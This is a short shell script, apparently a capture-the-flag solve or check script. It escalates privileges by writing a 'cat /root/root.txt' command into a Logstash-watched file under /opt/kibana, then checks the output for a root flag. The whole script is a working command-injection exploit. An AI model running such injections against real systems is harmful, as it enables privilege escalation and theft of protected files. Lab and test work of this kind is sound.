set -eu
rm -f /tmp/logstash-root
printf 'Ejecutar comando: cat /root/root.txt > /tmp/logstash-root\n' > /opt/kibana/logstash_0xdf
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/logstash-root ] && break
    sleep 1
done
out=$(cat /tmp/logstash-root 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "Logstash did not run as root" >&2; exit 1; }
